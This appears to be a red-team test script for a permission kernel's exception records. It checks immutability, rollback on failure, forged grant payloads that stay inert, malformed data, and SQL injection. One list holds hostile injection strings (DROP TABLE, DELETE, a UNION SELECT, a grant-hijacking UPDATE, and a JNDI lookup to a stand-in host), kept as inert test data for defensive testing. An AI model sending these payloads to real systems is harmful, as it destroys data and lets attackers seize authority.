"""Exception primitive red-team: immutability, atomicity, payload-to-power
escalation, SQL/storage injection, malformed diagnostic data, Receipt<->
Exception integrity, failure-while-recording-failure, and truth confusion.

Runs against a throwaway copy of the current development database, since
these checks intentionally exercise failure paths and direct-SQL attacks
and should never consume or corrupt shared development history.
"""

from __future__ import annotations

import json
import shutil
import sqlite3
import tempfile
from pathlib import Path

import kernel as kernel_module
from kernel import Kernel, KernelError


ROOT = "grant:genesis-root"
NATHAN = "identity:nathan"
CLAWDE = "identity:clawde"
GENESIS = "state:genesis"


def counts(conn: sqlite3.Connection) -> dict[str, int]:
    tables = [
        "states", "transitions", "receipts", "exceptions",
        "authority_grants", "authority_grant_revocations",
        "evidence", "receipt_evidence", "identities",
        "authorities",
    ]
    return {t: conn.execute(f"SELECT COUNT(*) FROM {t}").fetchone()[0] for t in tables}


source = Path(__file__).resolve().parent.parent / "data" / "kernel.db"
with tempfile.NamedTemporaryFile(prefix="exception-1-attacks-", suffix=".db") as f:
    f.close()
    db_path = Path(f.name)
    shutil.copy2(source, db_path)
    kernel = Kernel(db_path)

    # ------------------------------------------------------------
    # EXC-1: Immutability -- UPDATE/DELETE on exceptions blocked.
    # ------------------------------------------------------------

    try:
        kernel.transition(
            requester_identity_id=NATHAN,
            from_state_id=GENESIS,
            authority_grant_id=ROOT,
            new_state_payload={"probe": "exc-1-seed"},
            evidence_ids=["evidence:does-not-exist-exc-1"],
        )
    except KernelError:
        pass
    else:
        raise AssertionError("dangling evidence_id must reject transition()")

    with kernel.connect() as conn:
        exc_row = conn.execute(
            "SELECT exception_id, receipt_id, payload FROM exceptions "
            "ORDER BY rowid DESC LIMIT 1"
        ).fetchone()
        seed_exception_id, seed_receipt_id, seed_payload = exc_row

        try:
            conn.execute(
                "UPDATE exceptions SET payload = '{}' WHERE exception_id = ?",
                (seed_exception_id,),
            )
            conn.commit()
            raise AssertionError("UPDATE on exceptions must be blocked")
        except sqlite3.IntegrityError as exc:
            assert "immutable" in str(exc)

        try:
            conn.execute(
                "DELETE FROM exceptions WHERE exception_id = ?",
                (seed_exception_id,),
            )
            conn.commit()
            raise AssertionError("DELETE on exceptions must be blocked")
        except sqlite3.IntegrityError as exc:
            assert "append-only" in str(exc)

        still_there = conn.execute(
            "SELECT payload FROM exceptions WHERE exception_id = ?",
            (seed_exception_id,),
        ).fetchone()
        assert still_there[0] == seed_payload, "payload must be byte-identical after blocked UPDATE"

    print("EXC-1 (immutability: UPDATE/DELETE blocked) passed")

    # ------------------------------------------------------------
    # EXC-2: Atomic failure behavior across every entry point.
    # No authoritative effect may survive a FAILED/REJECTED op,
    # while exactly one Receipt + one Exception are produced.
    # ------------------------------------------------------------

    def assert_atomic_failure(label, fn):
        with kernel.connect() as conn:
            before = counts(conn)
        try:
            fn()
        except KernelError:
            pass
        else:
            raise AssertionError(f"{label}: expected failure")
        with kernel.connect() as conn:
            after = counts(conn)
            row = conn.execute(
                "SELECT receipt_id, outcome FROM receipts "
                "ORDER BY receipt_seq DESC LIMIT 1"
            ).fetchone()
            receipt_id, outcome = row
            exc_row = conn.execute(
                "SELECT exception_id FROM exceptions WHERE receipt_id = ?",
                (receipt_id,),
            ).fetchone()
        delta = {k: after[k] - before[k] for k in before}
        non_receipt_delta = {k: v for k, v in delta.items() if k not in ("receipts", "exceptions")}
        assert all(v == 0 for v in non_receipt_delta.values()), (
            f"{label}: authoritative effects leaked: {non_receipt_delta}"
        )
        assert delta["receipts"] == 1 and delta["exceptions"] == 1, (
            f"{label}: expected exactly 1 receipt + 1 exception, got {delta}"
        )
        assert outcome in ("REJECTED", "FAILED"), f"{label}: unexpected outcome {outcome}"
        assert exc_row is not None, f"{label}: Receipt/Exception must stay linked"
        return outcome

    # (a) transition(): genuine sqlite3.IntegrityError (dangling evidence_id)
    assert_atomic_failure(
        "transition/IntegrityError",
        lambda: kernel.transition(
            requester_identity_id=NATHAN,
            from_state_id=GENESIS,
            authority_grant_id=ROOT,
            new_state_payload={"probe": "exc-2a"},
            evidence_ids=["evidence:does-not-exist-exc-2a"],
        ),
    )

    # (b) grant(): KernelError (non-root requester) -> REJECTED
    outcome_b = assert_atomic_failure(
        "grant/non-root",
        lambda: kernel.grant(
            requester_identity_id=CLAWDE,
            authority_grant_id=ROOT,
            identity_id=CLAWDE,
            authority_id="authority:does-not-exist",
        ),
    )
    assert outcome_b == "REJECTED"

    # (c) revoke(): KernelError (last root grant) -> REJECTED
    assert_atomic_failure(
        "revoke/last-root",
        lambda: kernel.revoke(
            requester_identity_id=NATHAN,
            authority_grant_id=ROOT,
            grant_id=ROOT,
        ),
    )

    # (d) revoke_all(): KernelError (unknown identity) -> REJECTED
    assert_atomic_failure(
        "revoke_all/unknown-identity",
        lambda: kernel.revoke_all(
            requester_identity_id=NATHAN,
            authority_grant_id=ROOT,
            identity_id="identity:does-not-exist-exc-2d",
        ),
    )

    # (e) define_authority(): KernelError (duplicate authority_id)
    with kernel.connect() as conn:
        existing_authority = conn.execute(
            "SELECT authority_id FROM authorities LIMIT 1"
        ).fetchone()[0]
    assert_atomic_failure(
        "define_authority/duplicate",
        lambda: kernel.define_authority(
            requester_identity_id=NATHAN,
            authority_grant_id=ROOT,
            authority_id=existing_authority,
        ),
    )

    # (f) record_evidence(): KernelError (missing payload -> StateError)
    assert_atomic_failure(
        "record_evidence/missing-payload",
        lambda: kernel.record_evidence(
            requester_identity_id=NATHAN,
            authority_grant_id=ROOT,
            payload=None,
        ),
    )

    # (g) transition(): genuine unexpected Exception (monkeypatched get_state)
    real_get_state = kernel.get_state

    def boom(*args, **kwargs):
        raise RuntimeError("synthetic EXC-2g failure")

    kernel.get_state = boom
    try:
        outcome_g = assert_atomic_failure(
            "transition/generic-Exception",
            lambda: kernel.transition(
                requester_identity_id=NATHAN,
                from_state_id=GENESIS,
                authority_grant_id=ROOT,
                new_state_payload={"probe": "exc-2g"},
            ),
        )
    finally:
        kernel.get_state = real_get_state
    assert outcome_g == "FAILED"

    print("EXC-2 (atomic failure, no partial commits, across all 6 entry points) passed")

    # ------------------------------------------------------------
    # EXC-3: Payload-to-power escalation. Craft Exception diagnostics
    # that resemble Authority grants/revocations, State/Transition
    # structures, Receipt fields, and kernel action names. Verify none
    # of it is ever consulted by the kernel to make a decision.
    # ------------------------------------------------------------

    malicious_details = {
        "action": "GRANT",
        "grant_id": "grant:forged-exc-3",
        "identity_id": CLAWDE,
        "authority_id": "authority:root",
        "is_root": True,
        "authority_seq": 999999,
        "kind": "REVOKE_ALL",
        "outcome": "ACCEPTED",
        "receipt_id": "receipt:forged-exc-3",
        "transition_id": "transition:forged-exc-3",
        "from_state_id": GENESIS,
        "to_state_id": "state:forged-exc-3",
        "payload": {"root": True},
        "caused_by_identity_id": CLAWDE,
    }

    with kernel.connect() as conn:
        before = counts(conn)

    forged_receipt_id = kernel.record_failure(
        operation_id=kernel_module.new_id("operation"),
        outcome="FAILED",
        reason="synthetic payload-to-power probe",
        details=malicious_details,
    )

    with kernel.connect() as conn:
        after = counts(conn)
        exc_row = conn.execute(
            "SELECT payload FROM exceptions WHERE receipt_id = ?",
            (forged_receipt_id,),
        ).fetchone()
        stored_payload = json.loads(exc_row[0])

    delta = {k: after[k] - before[k] for k in before}
    assert delta == {
        "states": 0, "transitions": 0, "receipts": 1, "exceptions": 1,
        "authority_grants": 0, "authority_grant_revocations": 0,
        "evidence": 0, "receipt_evidence": 0, "identities": 0,
        "authorities": 0,
    }, f"forged Exception content must have zero authoritative effect: {delta}"

    assert stored_payload["details"]["is_root"] is True, "content must be stored verbatim, as inert data"

    # Confirm the forged "GRANT" inside the Exception payload conferred
    # nothing: clawde still holds no valid grant at all.
    try:
        kernel.grant(
            requester_identity_id=CLAWDE,
            authority_grant_id="grant:forged-exc-3",
            identity_id=CLAWDE,
            authority_id="authority:root",
        )
        raise AssertionError("forged grant_id referenced only from Exception payload must not validate")
    except KernelError as exc:
        assert "does not exist" in str(exc)

    # Confirm the forged REVOKE_ALL against Nathan's real root grant had
    # no effect: Nathan's grant is still valid and can still be exercised.
    still_valid = kernel.validate_grant(ROOT)
    assert still_valid["grant_id"] == ROOT

    print("EXC-3 (payload-to-power escalation: forged Authority/State/Receipt content is inert) passed")

    # ------------------------------------------------------------
    # EXC-4: SQL / storage injection via Exception diagnostic content.
    # ------------------------------------------------------------

    injection_payloads = [
        "'); DELETE FROM receipts; --",
        "'); DROP TABLE exceptions; --",
        "' OR '1'='1",
        "\x00\x01' UNION SELECT * FROM authority_grants--",
        "${jndi:ldap://evil/a}",
        "'; UPDATE authority_grants SET identity_id='identity:clawde' WHERE 1=1; --",
    ]

    def grants_fingerprint(conn: sqlite3.Connection) -> list:
        # Row-count deltas alone can't catch an UPDATE-style injection
        # (it doesn't change row counts), so snapshot the actual
        # grant_id -> identity_id/authority_id content instead.
        return conn.execute(
            "SELECT grant_id, identity_id, authority_id FROM authority_grants "
            "ORDER BY grant_id"
        ).fetchall()

    with kernel.connect() as conn:
        before = counts(conn)
        grants_before = grants_fingerprint(conn)

    injected_receipt_ids = []
    for payload_str in injection_payloads:
        rid = kernel.record_failure(
            operation_id=kernel_module.new_id("operation"),
            outcome="FAILED",
            reason="synthetic SQL-injection probe",
            details={"error": payload_str, "raw": payload_str},
        )
        injected_receipt_ids.append((rid, payload_str))

    with kernel.connect() as conn:
        after = counts(conn)
        for rid, payload_str in injected_receipt_ids:
            exc_row = conn.execute(
                "SELECT payload FROM exceptions WHERE receipt_id = ?", (rid,)
            ).fetchone()
            stored = json.loads(exc_row[0])
            assert stored["details"]["error"] == payload_str, "injection string must round-trip byte-identical as inert data"

    delta = {k: after[k] - before[k] for k in before}
    assert delta["receipts"] == len(injection_payloads)
    assert delta["exceptions"] == len(injection_payloads)
    assert delta["authority_grants"] == 0
    assert delta["authority_grant_revocations"] == 0
    assert delta["states"] == 0
    assert delta["transitions"] == 0

    with kernel.connect() as conn:
        grants_after = grants_fingerprint(conn)
    assert grants_after == grants_before, (
        "authority_grants content (grant_id/identity_id/authority_id) must "
        "be byte-identical -- an UPDATE-style injection wouldn't change row "
        "counts, only content, so this is checked separately"
    )

    with kernel.connect() as conn:
        exceptions_table_exists = conn.execute(
            "SELECT name FROM sqlite_master WHERE type='table' AND name='exceptions'"
        ).fetchone()

    assert exceptions_table_exists is not None, "DROP TABLE payload must not have executed"
    # authority_grants/authority_grant_revocations delta == 0 above already
    # proves the UPDATE-injection payload created no new row; the live dev
    # db already has many pre-existing identity:clawde root grants from
    # earlier, unrelated test sessions, so an absolute "clawde holds no
    # root grant" check would be a false positive here.

    print("EXC-4 (SQL/storage injection: content treated strictly as data, parameterized queries hold) passed")

    # ------------------------------------------------------------
    # EXC-5: Malformed diagnostic data.
    # ------------------------------------------------------------

    # 5a. Unicode / control characters / very large message -- must
    # round-trip byte-identical as ordinary inert data.
    weird_string = ("\x00\x01\u202e\uffff" + ("x" * 200_000) + "\U0001F600" * 50)
    with kernel.connect() as conn:
        before = counts(conn)
    rid = kernel.record_failure(
        operation_id=kernel_module.new_id("operation"),
        outcome="FAILED",
        reason="synthetic malformed-data probe (unicode/control/large)",
        details={"blob": weird_string},
    )
    with kernel.connect() as conn:
        after = counts(conn)
        stored = json.loads(
            conn.execute(
                "SELECT payload FROM exceptions WHERE receipt_id = ?", (rid,)
            ).fetchone()[0]
        )
    assert stored["details"]["blob"] == weird_string
    delta = {k: after[k] - before[k] for k in before}
    assert delta["receipts"] == 1 and delta["exceptions"] == 1

    print("EXC-5a (unicode/control chars/large payload: accepted, round-trips exactly) passed")

    # 5b. NaN/Infinity in caller-supplied `details` -- post-remediation,
    # record_failure() must degrade to a minimal kernel-authored fallback
    # diagnostic and STILL atomically produce exactly one Receipt +
    # Exception, rather than raising with zero receipt (the pre-
    # remediation F1 finding).
    with kernel.connect() as conn:
        before = counts(conn)

    rid_nan = kernel.record_failure(
        operation_id=kernel_module.new_id("operation"),
        outcome="FAILED",
        reason="synthetic NaN-in-details probe",
        details={"value": float("nan"), "nested": {"inf": float("inf")}},
    )

    with kernel.connect() as conn:
        after = counts(conn)
        stored_nan = json.loads(
            conn.execute(
                "SELECT payload FROM exceptions WHERE receipt_id = ?", (rid_nan,)
            ).fetchone()[0]
        )
    delta = {k: after[k] - before[k] for k in before}
    assert delta["receipts"] == 1 and delta["exceptions"] == 1, (
        f"F1 remediation: NaN in details must still produce exactly 1 "
        f"receipt + 1 exception via fallback, got delta={delta}"
    )
    assert stored_nan["reason"] == "synthetic NaN-in-details probe"
    assert stored_nan["details"]["kernel_fallback"] is True
    assert stored_nan["details"]["encode_error_type"] == "ValueError"
    assert "value" not in stored_nan["details"], "original unencodable content must not be retried/embedded in any form"
    assert "nan" not in json.dumps(stored_nan).lower() or "kernel_fallback" in json.dumps(stored_nan)

    print("EXC-5b (F1 remediation: NaN/Infinity details degrade to fallback, receipt+exception still atomic) passed")
    print(f"  fallback details: {stored_nan['details']}")

    # 5c. Deeply nested structure exceeding SQLite's json_valid() depth
    # limit (empirically 1000) -- same fallback guarantee.
    nested: dict = {}
    cursor = nested
    for _ in range(5000):
        cursor["n"] = {}
        cursor = cursor["n"]

    with kernel.connect() as conn:
        before = counts(conn)
    rid_deep = kernel.record_failure(
        operation_id=kernel_module.new_id("operation"),
        outcome="FAILED",
        reason="synthetic deep-nesting probe",
        details=nested,
    )
    with kernel.connect() as conn:
        after = counts(conn)
        stored_deep = json.loads(
            conn.execute(
                "SELECT payload FROM exceptions WHERE receipt_id = ?", (rid_deep,)
            ).fetchone()[0]
        )
    delta = {k: after[k] - before[k] for k in before}
    assert delta["receipts"] == 1 and delta["exceptions"] == 1, (
        f"F1 remediation: excessive nesting must still produce exactly 1 "
        f"receipt + 1 exception via fallback, got delta={delta}"
    )
    assert stored_deep["details"]["kernel_fallback"] is True
    assert stored_deep["details"]["encode_error_type"] == "IntegrityError"
    print("EXC-5c (F1 remediation: excessive nesting degrades to fallback, receipt+exception still atomic) passed")
    print(f"  fallback details: {stored_deep['details']}")

    print("EXC-5 (malformed diagnostic data) complete")

    # ------------------------------------------------------------
    # EXC-6: FAILED Receipt <-> Exception integrity.
    # ------------------------------------------------------------

    # 6a. Schema-level 1:1: a second Exception row cannot be inserted
    # against an already-linked receipt_id (exceptions.receipt_id UNIQUE).
    with kernel.connect() as conn:
        any_receipt_with_exception = conn.execute(
            "SELECT receipt_id FROM exceptions LIMIT 1"
        ).fetchone()[0]
        try:
            conn.execute(
                "INSERT INTO exceptions (exception_id, receipt_id, created_at, payload) "
                "VALUES ('exception:exc-6a-duplicate', ?, '2026-01-01T00:00:00Z', '{}')",
                (any_receipt_with_exception,),
            )
            conn.commit()
            raise AssertionError("duplicate Exception for same receipt_id must be rejected")
        except sqlite3.IntegrityError as exc:
            assert "UNIQUE" in str(exc)

    print("EXC-6a (schema-level 1:1 Receipt<->Exception, UNIQUE enforced) passed")

    # 6b. ACCEPTED receipts never acquire an Exception through any
    # supported operation.
    with kernel.connect() as conn:
        orphaned_accepted = conn.execute(
            """
            SELECT COUNT(*) FROM receipts r
            JOIN exceptions e ON e.receipt_id = r.receipt_id
            WHERE r.outcome = 'ACCEPTED'
            """
        ).fetchone()[0]
    assert orphaned_accepted == 0, "no ACCEPTED receipt may have an Exception"

    print("EXC-6b (no ACCEPTED receipt ever carries an Exception) passed")

    # 6c. record_failure() is a public method with no guard preventing
    # a caller from supplying an operation_id that collides with an
    # already-ACCEPTED operation's operation_id. Reproduce it.
    accepted = kernel.transition(
        requester_identity_id=NATHAN,
        from_state_id=GENESIS,
        authority_grant_id=ROOT,
        new_state_payload={"probe": "exc-6c-accepted"},
    )
    real_operation_id = accepted["operation_id"]

    with kernel.connect() as conn:
        accepted_receipt_count_before = conn.execute(
            "SELECT COUNT(*) FROM receipts WHERE operation_id = ?",
            (real_operation_id,),
        ).fetchone()[0]

    colliding_receipt_id = kernel.record_failure(
        operation_id=real_operation_id,
        outcome="FAILED",
        reason="synthetic operation_id collision probe",
        details={"note": "unrelated failure sharing operation_id with an ACCEPTED op"},
    )

    with kernel.connect() as conn:
        rows_for_operation = conn.execute(
            "SELECT receipt_id, outcome FROM receipts WHERE operation_id = ? "
            "ORDER BY receipt_seq",
            (real_operation_id,),
        ).fetchall()

    outcomes_for_operation = [r[1] for r in rows_for_operation]
    print(
        f"EXC-6c FINDING: operation_id {real_operation_id!r} now has "
        f"{len(rows_for_operation)} receipts with outcomes {outcomes_for_operation} "
        f"-- record_failure() has no check preventing a caller from attaching "
        f"an unrelated FAILED/REJECTED Exception to an operation_id that "
        f"already has a committed ACCEPTED receipt."
    )
    assert accepted_receipt_count_before == 1
    assert len(rows_for_operation) == 2
    assert set(outcomes_for_operation) == {"ACCEPTED", "FAILED"}

    print("EXC-6 (Receipt<->Exception integrity) complete")

    # ------------------------------------------------------------
    # EXC-7: Failure while recording failure.
    #
    # 7a. A failure during the exceptions insert that is NOT one of the
    # encoding-representability conditions F1 now handles (ValueError/
    # TypeError/RecursionError/json_valid IntegrityError) must NOT be
    # swallowed into a fallback -- it must still roll back the whole
    # transaction, including the already-executed but uncommitted
    # receipts INSERT. This is what keeps the F1 fallback catch narrow:
    # it only catches representability failures of caller-supplied
    # `details`, never masks a genuine unrelated bug as if it were one.
    # ------------------------------------------------------------

    real_encode_payload = kernel_module.encode_payload
    call_count = {"n": 0}

    def encode_payload_boom(payload):
        call_count["n"] += 1
        if call_count["n"] == 2:
            raise RuntimeError("synthetic EXC-7a mid-transaction failure")
        return real_encode_payload(payload)

    with kernel.connect() as conn:
        before = counts(conn)

    kernel_module.encode_payload = encode_payload_boom
    raised_exc7a = None
    try:
        kernel.record_failure(
            operation_id=kernel_module.new_id("operation"),
            outcome="FAILED",
            reason="synthetic EXC-7a probe",
            details={"note": "forces an unrelated failure on the exceptions insert specifically"},
        )
    except Exception as exc:
        raised_exc7a = exc
    finally:
        kernel_module.encode_payload = real_encode_payload

    with kernel.connect() as conn:
        after = counts(conn)
    delta = {k: after[k] - before[k] for k in before}

    assert raised_exc7a is not None, "EXC-7a setup failed to reproduce a mid-transaction error"
    assert isinstance(raised_exc7a, RuntimeError), (
        f"an unrelated RuntimeError must propagate unchanged, not get "
        f"reinterpreted as an F1 fallback case: got {type(raised_exc7a).__name__}"
    )
    print(
        f"EXC-7a: forcing an UNRELATED failure on the exceptions-row encode "
        f"(after the receipts-row insert already executed) raised "
        f"{type(raised_exc7a).__name__}: {raised_exc7a}; delta={delta}"
    )
    assert delta["receipts"] == 0, (
        "the already-executed but uncommitted receipts INSERT must roll back "
        "when an unrelated failure hits the exceptions INSERT in the same "
        "transaction -- confirms BEGIN IMMEDIATE / rollback semantics hold "
        "even when the failure occurs INSIDE record_failure() itself, and "
        "confirms F1's fallback catch does not over-broadly swallow this"
    )
    assert delta["exceptions"] == 0
    print("EXC-7a (unrelated failure inside record_failure(): whole transaction rolls back, no partial receipt, no fallback attempted) passed")

    # 7b. Now force an encoding-representability failure (the kind F1's
    # fallback IS meant to catch) on EVERY exceptions-insert attempt,
    # including the fallback retry itself. Per Nathan's remediation
    # decision: "If persistence of the FAILED Receipt/Exception itself
    # genuinely fails after fallback handling, preserve the existing
    # EXC-7 behavior: the transaction must roll back atomically."
    def encode_payload_always_unencodable(payload):
        if "details" in payload:
            raise ValueError("synthetic EXC-7b: exceptions payload can never encode, not even the fallback")
        return real_encode_payload(payload)

    with kernel.connect() as conn:
        before = counts(conn)

    kernel_module.encode_payload = encode_payload_always_unencodable
    raised_exc7b = None
    try:
        kernel.record_failure(
            operation_id=kernel_module.new_id("operation"),
            outcome="FAILED",
            reason="synthetic EXC-7b probe",
            details={"note": "ordinary details, but every exceptions-payload encode is forced to fail, fallback included"},
        )
    except Exception as exc:
        raised_exc7b = exc
    finally:
        kernel_module.encode_payload = real_encode_payload

    with kernel.connect() as conn:
        after = counts(conn)
    delta = {k: after[k] - before[k] for k in before}

    assert raised_exc7b is not None, "EXC-7b setup failed to reproduce a fallback-also-fails error"
    assert isinstance(raised_exc7b, ValueError)
    print(
        f"EXC-7b: forcing BOTH the original AND the fallback exceptions-row "
        f"encode to fail raised {type(raised_exc7b).__name__}: {raised_exc7b}; "
        f"delta={delta}"
    )
    assert delta["receipts"] == 0 and delta["exceptions"] == 0, (
        "if even the minimal kernel-authored fallback cannot be persisted, "
        "the kernel must not claim a receipt that was not actually "
        "committed -- full rollback, no phantom/partial failure record"
    )
    print("EXC-7b (fallback itself also fails: whole transaction still rolls back atomically, no phantom record) passed")

    # ------------------------------------------------------------
    # EXC-8: Truth confusion. False/malicious Exception content must
    # never be consulted by the kernel for Authority/State/admission
    # decisions. EXC-3 already demonstrated a forged GRANT-shaped
    # payload conferred nothing; this confirms the general case: an
    # Exception claiming a real, currently-valid grant was revoked
    # does not actually revoke it.
    # ------------------------------------------------------------

    kernel.record_failure(
        operation_id=kernel_module.new_id("operation"),
        outcome="FAILED",
        reason="synthetic truth-confusion probe",
        details={
            "message": f"{NATHAN} does not have authority",
            "action": "REVOKE",
            "grant_id": ROOT,
            "revoked": True,
        },
    )

    still_valid_after = kernel.validate_grant(ROOT)
    assert still_valid_after["grant_id"] == ROOT
    assert not kernel.is_grant_revoked(ROOT), (
        "an Exception's payload claiming a grant was revoked must not "
        "make is_grant_revoked() true -- only a real authority_grant_"
        "revocations row can do that"
    )

    # Confirm a real transition still succeeds using that grant --
    # i.e. the false diagnostic did not degrade the grant's own
    # standing in any way.
    still_works = kernel.transition(
        requester_identity_id=NATHAN,
        from_state_id=GENESIS,
        authority_grant_id=ROOT,
        new_state_payload={"probe": "exc-8-still-works"},
    )
    assert still_works["receipt_id"]

    print("EXC-8 (truth confusion: false Exception content never consulted for kernel decisions) passed")

    print()
    print("EXC-1 through EXC-8 complete. See FINDING lines above for items requiring judgment calls.")
